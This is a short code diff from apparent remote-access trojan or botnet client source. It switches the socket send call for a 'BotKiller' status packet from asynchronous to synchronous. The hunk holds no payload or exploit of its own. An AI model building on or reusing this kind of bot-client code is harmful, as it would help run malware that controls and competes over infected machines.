@@ -43,7 +43,7 @@ namespace Client.Handle_Packet
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "BotKiller";
                 msgpack.ForcePathObject("Count").AsString = count.ToString();
-                ClientSocket.BeginSend(msgpack.Encode2Bytes());
+                ClientSocket.Send(msgpack.Encode2Bytes());
             }
         }
 
